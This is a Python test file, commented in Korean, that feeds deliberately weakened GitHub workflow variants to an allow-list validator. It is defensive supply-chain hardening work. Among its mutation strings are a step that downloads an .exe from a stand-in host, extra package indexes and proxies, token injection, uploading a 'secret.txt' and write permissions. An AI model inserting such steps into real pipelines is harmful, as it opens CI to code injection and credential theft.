"""`ci.yml`·`package.yml` 허용 목록 규칙(`tests/workflow_golden.py`) 시험 — AS-S2 권고-7(결정 D-693).

감사 공급망 탐침(`probe_workflow_mutations.py`)이 안전 장치를 약하게 만든 사본 열한 개를 만들어 기존 시험을 돌렸더니 모두 통과했다. 이 시험은 그 열한 개를 글자 그대로 옮겨(진짜 워크플로 글에서 한 곳만 바꾼다)
**허용 목록 규칙이 모두 잡는지** 본다 — 대조군(좋은 글은 통과)과 같은 계열의 다른 약화(`if:`·`continue-on-error`·`env`·`with` 키 끼우기·단계 빼기·액션 갱신)도 함께 본다.
같은 규칙을 이미 있는 시험 묶음(`test_repo_layout.CiWorkflowTest`·`WorkflowPinningTest`, `test_packaging_workflow.RealWorkflowTest`, `test_ci_shard.CiWorkflowShardTest`)에도 한 가지씩 걸어 두었다 —
감사 탐침이 그 묶음만 돌려도 열한 개가 모두 빨개진다. 이 파일은 `.github/` 를 읽기만 한다(바꾸지 않는다). 네트워크 없이 돈다.

열한 개:
  ci.yml      ① 작업 단위 `permissions` 에 contents·id-token 쓰기 ② checkout 의 소유자·저장소 이름 바꾸기(40자리 SHA 모양만 맞춤) ③ checkout 의 SHA 값 바꾸기 ④ `persist-credentials: true`
              ⑤ matrix 의 os 에 `self-hosted` ⑥ 작업 단위 `env` 에 `PYTHONPATH`
  package.yml ⑦ 다른 `run` 단계 추가(내려받기 명령) ⑧ 한 줄 흐름식 단계로 태그 액션 추가 ⑨ pip 설치에 `--extra-index-url` ⑩ 빌드 명령을 문자열 출력으로 바꾸기(경로 글자만 남음) ⑪ `persist-credentials: true`

D-716(둘째 작업 `qt`): `ci.yml` 에 작업이 둘(`test`·`qt`)이 되자 이 시험이 빨개졌다 — 명세가 '작업은 `test` 하나' 였고, 위 변이의 옛 글(`timeout-minutes: 40`·checkout SHA·`persist-credentials: false`·`fail-fast: false` 같은 줄)이 두 작업에 되풀이돼
`change` 의 '옛 글은 파일에 한 번만 나와야 한다' 가 깨졌다. 그래서 (가) 명세를 두 작업(이름·순서·개수 포함)으로 넓혔고(`tests/workflow_golden.py`) (나) 위 열한 개와 같은 계열의 옛 변이는 글을 한 글자도 바꾸지 않고 `test` 작업 쪽에만 걸도록 감쌌다(`on_test_job` — 약화 0).
(다) 두 작업에 같은 변이를 한 번씩 거는 쌍둥이 표(`TWIN_SPECS`: 작업 단위 키·matrix·액션·`with`·단계 키·`env`·단계 더하기/빼기), `qt` 만의 표(`QT_ONLY_SPECS`·`QT_ONLY_STEPS`: 실행기·시간 한도·작업 이름·`python-version`·설치 줄·`CI_REQUIRE_QT`·`QT_QPA_PLATFORM`·단계 순서),
작업 목록 표(`JOB_LIST`: 세 번째 작업·이름 바꾸기·`test` 만 두기·`qt` 만 두기·순서)·이름 칸에 숨긴 액션 표기 표(`GLOBAL_SCAN_SPECS`)와 최상위 표(`TOP_LEVEL`)를 더했다 — 모두 걸리는 것만이 아니라 **어느 작업의 어떤 규칙이 잡았는지**까지 본다.
"""
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(Path(__file__).resolve().parent))
import workflow_golden as golden  # noqa: E402

OLD_SHA = golden.ACTIONS["actions/checkout"]
UPLOAD_HEAD = "      # SHA 는 이 초안을 만든 PC"


def real(name):
    return (ROOT / ".github" / "workflows" / name).read_bytes().decode("utf-8").replace("\r\n", "\n")


def change(text, old, new):
    if text.count(old) != 1:
        raise AssertionError("변이를 적용하지 못했다(원문이 한 번만 나와야 한다): " + repr(old[:60]) + " 횟수 " + str(text.count(old)))
    return text.replace(old, new, 1)


# D-716: `ci.yml` 에 둘째 작업 `qt` 가 붙었다 — 아래 옛 표(`*_WHOLE`)의 변이는 옛 글이 파일에 한 번만 나온다고 보고 쓰였는데 두 작업이 같은 줄을 되풀이해 그 가정이 깨졌다(`change` 가 '적용하지 못했다' 로 빨개진다).
# 옛 표의 글은 한 글자도 바꾸지 않고 `test` 작업 쪽에만 걸도록 감싼다(`on_test_job`). `qt` 작업에는 아래의 새 표를 따로 건다.
QT_MARK = "\n  qt:\n"                      # 둘째 작업 `qt` 가 시작하는 줄(앞의 줄 바꿈 포함) — 글을 `test` 쪽(파일 머리·최상위 키·test 작업)과 `qt` 쪽으로 가른다


def change_in(text, job, old, new):
    """`change` 와 같되 `job`(`test` 또는 `qt`)의 글 안에서만 한 곳을 바꾼다 — 두 작업이 같은 줄을 되풀이해도 옛 글이 그 쪽에 한 번만 나오면 된다."""
    head, marker, tail = text.partition(QT_MARK)
    if not marker:
        raise AssertionError("ci.yml 에서 qt 작업이 시작하는 줄을 찾지 못했다")
    if job == "qt":
        return head + marker + change(tail, old, new)
    if job == "test":
        return change(head, old, new) + marker + tail
    raise AssertionError("작업 이름은 test 나 qt 다: " + repr(job))


def on_test_job(mutate):
    """옛 표(D-693)의 변이를 `test` 작업 쪽 글에만 거는 함수로 감싼다 — 그때 파일에는 작업이 그것 하나였다."""
    def apply(text):
        head, marker, tail = text.partition(QT_MARK)
        return mutate(head) + marker + tail
    return apply


CI_MUTATIONS_WHOLE = {
    "① 작업 단위 permissions 에 contents·id-token 쓰기": lambda text: change(text, "    timeout-minutes: 40\n", "    timeout-minutes: 40\n    permissions:\n      contents: write\n      id-token: write\n"),
    "② checkout 의 소유자·저장소를 다른 이름으로(40자리 모양만 맞춤)": lambda text: change(text, "actions/checkout@" + OLD_SHA, "canary-org/checkout@" + "a" * 40),
    "③ checkout 의 SHA 를 다른 40자리로": lambda text: change(text, "actions/checkout@" + OLD_SHA, "actions/checkout@" + "b" * 40),
    "④ persist-credentials 를 true 로": lambda text: change(text, "persist-credentials: false", "persist-credentials: true"),
    "⑤ matrix 의 os 에 self-hosted 추가": lambda text: change(text, "os: [ubuntu-latest, windows-latest]", "os: [ubuntu-latest, windows-latest, self-hosted]"),
    "⑥ 작업 단위 env 에 PYTHONPATH": lambda text: change(text, "    timeout-minutes: 40\n", "    timeout-minutes: 40\n    env:\n      PYTHONPATH: CANARY_ELSEWHERE\n"),
}
PACKAGE_MUTATIONS = {
    "⑦ 다른 run 단계를 하나 더(내려받기 명령)": lambda text: change(text, UPLOAD_HEAD, "      - name: CANARY 추가 단계\n        run: Invoke-WebRequest -Uri 'CANARY.invalid/x' -OutFile \"$env:RUNNER_TEMP/x.exe\"\n\n" + UPLOAD_HEAD),
    "⑧ 한 줄 흐름식 단계로 태그 액션 추가": lambda text: change(text, UPLOAD_HEAD, "      - {uses: actions/cache@v4}\n\n" + UPLOAD_HEAD),
    "⑨ pip 설치에 추가 색인": lambda text: change(text, "run: python -m pip install -r packaging/requirements-package.txt", "run: python -m pip install --extra-index-url CANARY.invalid/simple -r packaging/requirements-package.txt"),
    "⑩ 빌드 명령을 문자열 출력으로(경로 글자만 남음)": lambda text: change(text, 'run: python packaging/build_package.py --out-dir "$env:RUNNER_TEMP/package"', "run: python -c \"print('packaging/build_package.py')\""),
    "⑪ persist-credentials 를 true 로": lambda text: change(text, "persist-credentials: false", "persist-credentials: true"),
}
# 같은 계열의 다른 약화 — 감사의 열한 개 말고도 허용 목록이 잡아야 하는 것
CI_OTHER_WHOLE = {
    "단계에 if": lambda text: change(text, "      - name: 시험 실행(조각 ${{ matrix.shard }}/3)\n", "      - name: 시험 실행(조각 ${{ matrix.shard }}/3)\n        if: always()\n"),
    "단계에 continue-on-error": lambda text: change(text, "        run: python scripts/ci_shard.py\n", "        run: python scripts/ci_shard.py\n        continue-on-error: true\n"),
    "run 끝에 || true": lambda text: change(text, "run: python scripts/ci_shard.py\n", "run: python scripts/ci_shard.py || true\n"),
    "시험 단계의 env 에 키를 더함": lambda text: change(text, "          CI_SHARD_TOTAL: '3'\n", "          CI_SHARD_TOTAL: '3'\n          PIP_INDEX_URL: CANARY.invalid\n"),
    "조각 수를 바꿈": lambda text: change(text, "          CI_SHARD_TOTAL: '3'\n", "          CI_SHARD_TOTAL: '2'\n"),
    "matrix 에 include": lambda text: change(text, "        shard: [1, 2, 3]\n", "        shard: [1, 2, 3]\n        include:\n          - os: self-hosted\n"),
    "matrix 에 exclude": lambda text: change(text, "        shard: [1, 2, 3]\n", "        shard: [1, 2, 3]\n        exclude:\n          - os: windows-latest\n"),
    "runs-on 을 고정 값으로": lambda text: change(text, "    runs-on: ${{ matrix.os }}\n", "    runs-on: self-hosted\n"),
    "작업 단위 if": lambda text: change(text, "    timeout-minutes: 40\n", "    timeout-minutes: 40\n    if: github.ref == 'refs/heads/main'\n"),
    "checkout 의 with 에 키를 더함": lambda text: change(text, "          persist-credentials: false\n", "          persist-credentials: false\n          token: CANARY.invalid\n"),
    "setup-python 의 버전을 고정": lambda text: change(text, "          python-version: ${{ matrix.python }}\n", "          python-version: '3.12'\n"),
    "단계 하나를 뺌": lambda text: change(text, "      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065  # v5.6.0\n        with:\n          python-version: ${{ matrix.python }}\n\n", ""),
    "트리거에 pull_request_target": lambda text: change(text, "on:\n  push:\n  workflow_dispatch:\n", "on:\n  push:\n  pull_request_target:\n  workflow_dispatch:\n"),
    "최상위 permissions 를 쓰기로": lambda text: change(text, "permissions:\n  contents: read\n", "permissions:\n  contents: write\n"),
    "액션 하나가 태그": lambda text: change(text, "actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065", "actions/setup-python@v5"),
    "흐름식 matrix 한 줄을 다른 곳에 끼움": lambda text: change(text, "      fail-fast: false\n", "      fail-fast: false\n      max-parallel: [1]\n"),
}
PACKAGE_OTHER = {
    "작업 단위 permissions": lambda text: change(text, "    timeout-minutes: 30\n", "    timeout-minutes: 30\n    permissions:\n      contents: write\n"),
    "작업 env 에 키를 더함": lambda text: change(text, "      PYTHONUTF8: '1'\n", "      PYTHONUTF8: '1'\n      PIP_INDEX_URL: CANARY.invalid\n"),
    "단계에 if": lambda text: change(text, "      - name: SHA-256 보기", "      - if: always()\n        name: SHA-256 보기"),
    "단계에 shell": lambda text: change(text, "        run: Get-Content \"$env:RUNNER_TEMP/package/release/SHA256SUMS\"\n", "        shell: cmd\n        run: Get-Content \"$env:RUNNER_TEMP/package/release/SHA256SUMS\"\n"),
    "올리는 파일을 더함": lambda text: change(text, "            ${{ runner.temp }}/package/release/PACKAGE_INFO.json\n", "            ${{ runner.temp }}/package/release/PACKAGE_INFO.json\n            ${{ runner.temp }}/package/work/secret.txt\n"),
    "보존 기간을 늘림": lambda text: change(text, "retention-days: 14", "retention-days: 90"),
    "산출물 이름을 바꿈": lambda text: change(text, "name: ChanceBlogDesktop-preview", "name: ChanceBlogDesktop-release"),
    "트리거에 push": lambda text: change(text, "on:\n  workflow_dispatch:\n", "on:\n  push:\n  workflow_dispatch:\n"),
    "입력칸을 더함": lambda text: change(text, "on:\n  workflow_dispatch:\n", "on:\n  workflow_dispatch:\n    inputs:\n      note:\n        type: string\n"),
    "서명 단계를 더함": lambda text: change(text, UPLOAD_HEAD, "      - name: 서명\n        run: signtool sign /f x.pfx x.exe\n\n" + UPLOAD_HEAD),
    "단계를 뺌": lambda text: change(text, "      - name: SHA-256 보기(공개 값이다 — 운영자가 개인 PC 에서 대조한다)\n        run: Get-Content \"$env:RUNNER_TEMP/package/release/SHA256SUMS\"\n\n", ""),
    "runner 를 바꿈": lambda text: change(text, "runs-on: windows-latest", "runs-on: ubuntu-latest"),
    "setup-python 의 버전": lambda text: change(text, "python-version: '3.12'", "python-version: '3.13'"),
    "upload-artifact 의 SHA": lambda text: change(text, "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02", "actions/upload-artifact@" + "c" * 40),
}
CI_MUTATIONS = {label: on_test_job(mutate) for label, mutate in CI_MUTATIONS_WHOLE.items()}        # 옛 표를 test 작업 쪽에만 거는 모양으로(글은 그대로)
CI_OTHER = {label: on_test_job(mutate) for label, mutate in CI_OTHER_WHOLE.items()}

# --- D-716: 두 작업(`test`·`qt`)을 모두 못박는 새 변이 표 ----------------------------------------------------------------------------------------------------------------------
# 앵커 줄은 진짜 `ci.yml` 의 글 그대로다 — 줄이 바뀌면 `change` 가 '적용하지 못했다' 로 빨개지므로 승인값 표와 함께 고치게 된다.
SETUP_SHA = golden.ACTIONS["actions/setup-python"]
UPLOAD_SHA = golden.ACTIONS["actions/upload-artifact"]
CHECKOUT_REF = "actions/checkout@" + OLD_SHA
SETUP_REF = "actions/setup-python@" + SETUP_SHA
TIMEOUT_LINE = "    timeout-minutes: 40\n"
FAIL_FAST_LINE = "      fail-fast: false\n"
SHARD_LINE = "        shard: [1, 2, 3]\n"
CHECKOUT_HEAD = "      - uses: " + CHECKOUT_REF + "  # v4.4.0\n"
SETUP_HEAD = "      - uses: " + SETUP_REF + "  # v5.6.0\n"
CHECKOUT_WITH = "        with:\n          persist-credentials: false\n"
PERSIST_LINE = "          persist-credentials: false\n"
SHARD_RUN = "        run: python scripts/ci_shard.py\n"
SHARD_ENV_LINE = "          CI_SHARD: ${{ matrix.shard }}\n"
TOTAL_LINE = "          CI_SHARD_TOTAL: '3'\n"
UTF8_LINE = "          PYTHONUTF8: '1'\n"
QT_RUNS_ON = "    runs-on: windows-latest\n"
QT_NAME_LINE = "    name: Qt 시험 (windows-latest, Python 3.12, 조각 ${{ matrix.shard }}/3)\n"
QT_PYTHON_LINE = "          python-version: '3.12'\n"
QT_SETUP_NAME = "      - name: PySide6 두 줄만 설치·점검\n"
QT_SETUP_BLOCK = QT_SETUP_NAME + "        run: python scripts/ci_qt_setup.py\n"
QT_SHARD_BLOCK = ("      - name: Qt 시험 실행(조각 ${{ matrix.shard }}/3)\n        env:\n" + UTF8_LINE + SHARD_ENV_LINE + TOTAL_LINE
                  + "          CI_REQUIRE_QT: '1'\n          QT_QPA_PLATFORM: offscreen\n" + SHARD_RUN)
CANARY_STEP = "      - name: CANARY 추가 단계\n        run: Invoke-WebRequest -Uri 'CANARY.invalid/x' -OutFile x.exe\n\n"


def after(anchor, extra):
    """(옛 글, 새 글) — 앵커 줄 바로 뒤에 `extra` 를 끼운다."""
    return anchor, anchor + extra


# 두 작업에 같은 변이를 한 번씩 건다 — (이름, 옛 글, 새 글, 문제 글에 들어 있어야 할 낱말). 문제 글은 `작업 <이름>:` 으로 시작해 그 작업의 규칙이 잡은 것이어야 한다.
TWIN_SPECS = (
    ("작업 단위 permissions 에 contents·id-token 쓰기", *after(TIMEOUT_LINE, "    permissions:\n      contents: write\n      id-token: write\n"), "작업 키"),
    ("작업 단위 env 에 PYTHONPATH", *after(TIMEOUT_LINE, "    env:\n      PYTHONPATH: CANARY_ELSEWHERE\n"), "작업 키"),
    ("작업 단위 env 에 PIP_INDEX_URL", *after(TIMEOUT_LINE, "    env:\n      PIP_INDEX_URL: CANARY.invalid\n"), "작업 키"),
    ("작업 단위 env 에 프록시", *after(TIMEOUT_LINE, "    env:\n      HTTPS_PROXY: CANARY.invalid\n"), "작업 키"),
    ("작업 단위 if", *after(TIMEOUT_LINE, "    if: github.ref == 'refs/heads/main'\n"), "작업 키"),
    ("작업 단위 needs", *after(TIMEOUT_LINE, "    needs: CANARY_other\n"), "작업 키"),
    ("작업 단위 container", *after(TIMEOUT_LINE, "    container:\n      image: CANARY.invalid/x\n"), "작업 키"),
    ("작업 단위 services", *after(TIMEOUT_LINE, "    services:\n      cache:\n        image: CANARY.invalid/y\n"), "작업 키"),
    ("작업 단위 defaults", *after(TIMEOUT_LINE, "    defaults:\n      run:\n        shell: cmd\n"), "작업 키"),
    ("작업 단위 continue-on-error", *after(TIMEOUT_LINE, "    continue-on-error: true\n"), "작업 키"),
    ("작업 단위 environment", *after(TIMEOUT_LINE, "    environment: production\n"), "작업 키"),
    ("작업 단위 concurrency", *after(TIMEOUT_LINE, "    concurrency: CANARY-group\n"), "작업 키"),
    ("작업 단위 outputs", *after(TIMEOUT_LINE, "    outputs:\n      CANARY: x\n"), "작업 키"),
    ("matrix 에 include", *after(SHARD_LINE, "        include:\n          - shard: 9\n"), "strategy"),
    ("matrix 에 exclude", *after(SHARD_LINE, "        exclude:\n          - shard: 2\n"), "strategy"),
    ("matrix 에 다른 키", *after(SHARD_LINE, "        runner: CANARY\n"), "strategy"),
    ("strategy 에 max-parallel", *after(FAIL_FAST_LINE, "      max-parallel: 1\n"), "strategy"),
    ("fail-fast 를 true 로", FAIL_FAST_LINE, "      fail-fast: true\n", "strategy"),
    ("조각 목록에서 하나를 뺌", SHARD_LINE, "        shard: [1, 2]\n", "strategy"),
    ("조각 목록에 하나를 더함", SHARD_LINE, "        shard: [1, 2, 3, 4]\n", "strategy"),
    ("조각 목록의 순서를 바꿈", SHARD_LINE, "        shard: [3, 2, 1]\n", "strategy"),
    ("가져오기 액션의 SHA", CHECKOUT_REF, "actions/checkout@" + "b" * 40, "액션"),
    ("가져오기 액션의 소유자·저장소", CHECKOUT_REF, "canary-org/checkout@" + "a" * 40, "액션"),
    ("가져오기 액션을 태그로", CHECKOUT_REF, "actions/checkout@v4", "액션"),
    ("가져오기 자리에 승인된 다른 액션", CHECKOUT_REF, "actions/upload-artifact@" + UPLOAD_SHA, "액션"),
    ("파이썬 액션의 SHA", SETUP_REF, "actions/setup-python@" + "b" * 40, "액션"),
    ("파이썬 액션의 소유자·저장소", SETUP_REF, "canary-org/setup-python@" + "a" * 40, "액션"),
    ("파이썬 액션을 태그로", SETUP_REF, "actions/setup-python@v5", "액션"),
    ("persist-credentials 를 true 로", PERSIST_LINE, "          persist-credentials: true\n", "with"),
    ("가져오기 with 에 token", *after(PERSIST_LINE, "          token: CANARY.invalid\n"), "with"),
    ("가져오기 with 에 다른 저장소", *after(PERSIST_LINE, "          repository: canary-org/other\n"), "with"),
    ("가져오기 with 를 통째로 뺌", CHECKOUT_WITH, "", "with"),
    ("가져오기 단계에 env", *after(CHECKOUT_WITH, "        env:\n          PIP_INDEX_URL: CANARY.invalid\n"), "env"),
    ("시험 단계에 if", *after(SHARD_RUN, "        if: always()\n"), "허용되지 않은 키"),
    ("시험 단계에 continue-on-error", *after(SHARD_RUN, "        continue-on-error: true\n"), "허용되지 않은 키"),
    ("시험 단계에 shell", *after(SHARD_RUN, "        shell: bash\n"), "허용되지 않은 키"),
    ("시험 단계에 working-directory", *after(SHARD_RUN, "        working-directory: scripts\n"), "허용되지 않은 키"),
    ("시험 단계에 단계 수준 timeout-minutes", *after(SHARD_RUN, "        timeout-minutes: 1\n"), "허용되지 않은 키"),
    ("시험 단계에 id", *after(SHARD_RUN, "        id: CANARY\n"), "허용되지 않은 키"),
    ("시험 단계 run 끝에 || true", SHARD_RUN, "        run: python scripts/ci_shard.py || true\n", "run 명령"),
    ("시험 단계 run 을 다른 명령으로", SHARD_RUN, "        run: python -m unittest discover -s tests\n", "run 명령"),
    ("시험 단계 env 에 PIP_INDEX_URL", *after(TOTAL_LINE, "          PIP_INDEX_URL: CANARY.invalid\n"), "env"),
    ("시험 단계 env 에 PYTHONPATH", *after(TOTAL_LINE, "          PYTHONPATH: CANARY_ELSEWHERE\n"), "env"),
    ("시험 단계 env 에 프록시", *after(TOTAL_LINE, "          HTTPS_PROXY: CANARY.invalid\n"), "env"),
    ("조각 총수를 2 로", TOTAL_LINE, "          CI_SHARD_TOTAL: '2'\n", "env"),
    ("조각 번호를 1 로 고정", SHARD_ENV_LINE, "          CI_SHARD: '1'\n", "env"),
    ("PYTHONUTF8 를 뺌", UTF8_LINE, "", "env"),
    ("PYTHONUTF8 를 0 으로", UTF8_LINE, "          PYTHONUTF8: '0'\n", "env"),
    ("단계를 하나 더함(내려받기 명령)", SETUP_HEAD, CANARY_STEP + SETUP_HEAD, "단계 목록"),
    ("가져오기 단계를 뺌", CHECKOUT_HEAD + CHECKOUT_WITH + "\n", "", "단계 목록"),
    ("끝에 단계를 하나 더함", SHARD_RUN, SHARD_RUN + "\n      - name: CANARY 끝 단계\n        run: echo CANARY\n", "단계 목록"),
    ("한 줄 흐름식 단계로 태그 액션을 더함", SETUP_HEAD, "      - {uses: actions/cache@v4}\n\n" + SETUP_HEAD, "읽을 수 없는 표기"),
)

# `qt` 작업만의 값 — 실행기·시간 한도(정확히 40분)·작업 이름·파이썬 버전·설치 줄·`CI_REQUIRE_QT`·`QT_QPA_PLATFORM`
QT_ONLY_SPECS = (
    ("runs-on 을 self-hosted 로", QT_RUNS_ON, "    runs-on: self-hosted\n", "runs-on"),
    ("runs-on 을 ubuntu-latest 로", QT_RUNS_ON, "    runs-on: ubuntu-latest\n", "runs-on"),
    ("runs-on 을 windows-2022 로", QT_RUNS_ON, "    runs-on: windows-2022\n", "runs-on"),
    ("runs-on 을 matrix.os 로(조각 표에는 os 가 없다)", QT_RUNS_ON, "    runs-on: ${{ matrix.os }}\n", "runs-on"),
    ("runs-on 을 group 매핑으로", QT_RUNS_ON, "    runs-on:\n      group: CANARY\n", "runs-on"),
    ("runs-on 을 한 줄 목록으로", QT_RUNS_ON, "    runs-on: [self-hosted, windows]\n", "읽을 수 없는 표기"),
    ("시간 한도 39분", TIMEOUT_LINE, "    timeout-minutes: 39\n", "timeout-minutes"),
    ("시간 한도 41분", TIMEOUT_LINE, "    timeout-minutes: 41\n", "timeout-minutes"),
    ("시간 한도 60분", TIMEOUT_LINE, "    timeout-minutes: 60\n", "timeout-minutes"),
    ("시간 한도 400분", TIMEOUT_LINE, "    timeout-minutes: 400\n", "timeout-minutes"),
    ("시간 한도를 빈 값으로", TIMEOUT_LINE, "    timeout-minutes:\n", "timeout-minutes"),
    ("시간 한도 줄을 지움", TIMEOUT_LINE, "", "작업 키"),
    ("작업 이름의 접두어를 바꿈", "    name: Qt 시험 (", "    name: Qt 검사 (", "name"),
    ("작업 이름의 조각 총수를 /2 로", "조각 ${{ matrix.shard }}/3)\n    runs-on", "조각 ${{ matrix.shard }}/2)\n    runs-on", "name"),
    ("작업 이름의 러너 표기를 바꿈", "(windows-latest, Python 3.12,", "(ubuntu-latest, Python 3.12,", "name"),
    ("작업 이름을 test 작업의 이름 꼴로", QT_NAME_LINE, "    name: 시험 (${{ matrix.os }}, Python ${{ matrix.python }}, 조각 ${{ matrix.shard }}/3)\n", "name"),
    ("작업 이름 뒤에 글자를 더함", QT_NAME_LINE, QT_NAME_LINE[:-1] + " CANARY\n", "name"),
    ("작업 이름 앞에 글자를 더함", QT_NAME_LINE, "    name: CANARY " + QT_NAME_LINE[len("    name: "):], "name"),
    ("작업 이름 줄을 지움", QT_NAME_LINE, "", "작업 키"),
    ("matrix 에 os 키", *after(SHARD_LINE, "        os: [ubuntu-latest]\n"), "strategy"),
    ("matrix 에 python 키", *after(SHARD_LINE, "        python: ['3.10']\n"), "strategy"),
    ("strategy 를 통째로 지움", "    strategy:\n      fail-fast: false\n      matrix:\n        shard: [1, 2, 3]\n", "", "작업 키"),
    ("파이썬 버전을 3.10 으로", QT_PYTHON_LINE, "          python-version: '3.10'\n", "with"),
    ("파이썬 버전을 3.13 으로", QT_PYTHON_LINE, "          python-version: '3.13'\n", "with"),
    ("파이썬 버전을 3.12.1 로", QT_PYTHON_LINE, "          python-version: '3.12.1'\n", "with"),
    ("파이썬 버전을 matrix.python 으로", QT_PYTHON_LINE, "          python-version: ${{ matrix.python }}\n", "with"),
    ("파이썬 with 에 cache", *after(QT_PYTHON_LINE, "          cache: pip\n"), "with"),
    ("설치 줄을 직접 pip 로", "run: python scripts/ci_qt_setup.py", "run: python -m pip install PySide6", "run 명령"),
    ("설치 줄에 인자를 더함", "run: python scripts/ci_qt_setup.py", "run: python scripts/ci_qt_setup.py --index-url CANARY.invalid", "run 명령"),
    ("설치 줄 끝에 || true", "run: python scripts/ci_qt_setup.py", "run: python scripts/ci_qt_setup.py || true", "run 명령"),
    ("설치 줄에 두 번째 명령", "run: python scripts/ci_qt_setup.py", "run: python scripts/ci_qt_setup.py && python CANARY.py", "run 명령"),
    ("설치 줄을 다른 파일로", "run: python scripts/ci_qt_setup.py", "run: python CANARY_setup.py", "run 명령"),
    ("설치 단계에 env", *after(QT_SETUP_NAME, "        env:\n          PIP_INDEX_URL: CANARY.invalid\n"), "env"),
    ("설치 단계에 with", *after(QT_SETUP_NAME, "        with:\n          CANARY: x\n"), "run 명령"),
    ("설치 단계를 뺌", QT_SETUP_BLOCK + "\n", "", "단계 목록"),
    ("CI_REQUIRE_QT 를 0 으로", "          CI_REQUIRE_QT: '1'\n", "          CI_REQUIRE_QT: '0'\n", "env"),
    ("CI_REQUIRE_QT 를 빈 값으로", "          CI_REQUIRE_QT: '1'\n", "          CI_REQUIRE_QT: ''\n", "env"),
    ("CI_REQUIRE_QT 를 지움", "          CI_REQUIRE_QT: '1'\n", "", "env"),
    ("QT_QPA_PLATFORM 을 windows 로", "          QT_QPA_PLATFORM: offscreen\n", "          QT_QPA_PLATFORM: windows\n", "env"),
    ("QT_QPA_PLATFORM 을 minimal 로", "          QT_QPA_PLATFORM: offscreen\n", "          QT_QPA_PLATFORM: minimal\n", "env"),
    ("QT_QPA_PLATFORM 을 지움", "          QT_QPA_PLATFORM: offscreen\n", "", "env"),
)
# 이름 칸(작업·단계 이름은 값을 못박지 않는 곳)에 `uses:` 표기를 숨기면 구조 견주기는 못 보고 파일 전체의 액션 훑기만 잡는다 — (이름, 작업, 옛 글, 새 글)
GLOBAL_SCAN_SPECS = (
    ("test 작업의 단계 이름 안에 다른 액션 표기", "test", "      - name: 시험 실행(", "      - name: 시험 실행 uses:canary-org/x@v1 ("),
    ("qt 작업의 단계 이름 안에 다른 액션 표기", "qt", QT_SETUP_NAME, "      - name: PySide6 두 줄만 설치·점검 uses:canary-org/x@v1\n"),
)
# 단계 순서·개수처럼 글을 통째로 옮기는 `qt` 작업만의 변이 — 이름: (함수, 낱말)
QT_ONLY_STEPS = {
    "가져오기와 파이썬 단계의 순서를 바꿈": (lambda text: change_in(text, "qt", CHECKOUT_HEAD + CHECKOUT_WITH + "\n" + SETUP_HEAD + "        with:\n" + QT_PYTHON_LINE,
                                                         SETUP_HEAD + "        with:\n" + QT_PYTHON_LINE + "\n" + CHECKOUT_HEAD + CHECKOUT_WITH), "액션"),
    "설치 단계와 시험 단계의 순서를 바꿈": (lambda text: change_in(text, "qt", QT_SETUP_BLOCK + "\n" + QT_SHARD_BLOCK, QT_SHARD_BLOCK + "\n" + QT_SETUP_BLOCK), "run 명령"),
    "시험 단계를 두 번 둠": (lambda text: change_in(text, "qt", QT_SHARD_BLOCK, QT_SHARD_BLOCK + "\n" + QT_SHARD_BLOCK), "단계 목록"),
    "설치 단계를 두 번 둠": (lambda text: change_in(text, "qt", QT_SETUP_BLOCK, QT_SETUP_BLOCK + "\n" + QT_SETUP_BLOCK), "단계 목록"),
    "파이썬 단계를 뺌": (lambda text: change_in(text, "qt", SETUP_HEAD + "        with:\n" + QT_PYTHON_LINE + "\n", ""), "단계 목록"),
    "첫 단계 앞에 단계를 더함": (lambda text: change_in(text, "qt", "    steps:\n", "    steps:\n      - run: echo CANARY\n\n"), "단계 목록"),
}


def jobs_start(text):
    """글의 맨 앞에서 `jobs:` 줄까지(그 줄 포함)."""
    head, marker, _ = text.partition("\njobs:\n")
    return head + marker


def third_job_at_the_end(text):
    return text.rstrip("\n") + "\n\n  extra:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo CANARY\n"


def third_job_in_the_middle(text):
    head, marker, tail = text.partition(QT_MARK)
    return head + "\n  extra:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo CANARY" + marker + tail


def only_the_qt_job(text):
    _, marker, tail = text.partition(QT_MARK)
    return jobs_start(text) + marker[1:] + tail


def only_the_test_job(text):
    """`qt` 작업이 생기기 전의 `ci.yml` 모양."""
    head, _, _ = text.partition(QT_MARK)
    return head + "\n"


def the_two_jobs_swapped(text):
    head, marker, tail = text.partition(QT_MARK)
    return jobs_start(text) + marker[1:] + tail.rstrip("\n") + "\n\n  test:\n" + head.partition("\n  test:\n")[2] + "\n"


# 작업의 이름·순서·개수 — 어느 작업이 아니라 파일 전체의 규칙('작업 목록')이 잡는다
JOB_LIST = {
    "세 번째 작업을 끝에 더함": third_job_at_the_end,
    "세 번째 작업을 test 와 qt 사이에 끼움": third_job_in_the_middle,
    "qt 작업을 통째로 복사해 이름만 바꿔 더함": lambda text: text.rstrip("\n") + "\n\n  qt_copy:\n" + text.partition(QT_MARK)[2],
    "qt 작업의 이름을 바꿈": lambda text: change(text, QT_MARK, "\n  qt2:\n"),
    "test 작업의 이름을 바꿈": lambda text: change(text, "\n  test:\n", "\n  test2:\n"),
    "test 작업을 지우고 qt 만 둠": only_the_qt_job,
    "qt 작업을 지우고 test 만 둠(둘째 작업이 생기기 전의 모양)": only_the_test_job,
    "두 작업의 순서를 바꿈": the_two_jobs_swapped,
    "작업을 모두 지움": jobs_start,
}
# 최상위 — 이름: (함수, 낱말)
TOP_LEVEL = {
    "최상위 env 를 더함": (lambda text: change(text, "\njobs:\n", "\nenv:\n  PIP_INDEX_URL: CANARY.invalid\n\njobs:\n"), "최상위 키"),
    "최상위 defaults 를 더함": (lambda text: change(text, "\njobs:\n", "\ndefaults:\n  run:\n    shell: cmd\n\njobs:\n"), "최상위 키"),
    "최상위 permissions 를 read-all 로": (lambda text: change(text, "permissions:\n  contents: read\n", "permissions: read-all\n"), "permissions 가"),
    "최상위 permissions 에 쓰기 하나를 더함": (lambda text: change(text, "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  packages: write\n"), "permissions 가"),
    "트리거에 schedule": (lambda text: change(text, "on:\n  push:\n", "on:\n  push:\n  schedule:\n    - cron: '0 0 * * *'\n"), "on 가"),
    "트리거에 pull_request": (lambda text: change(text, "on:\n  push:\n", "on:\n  pull_request:\n  push:\n"), "on 가"),
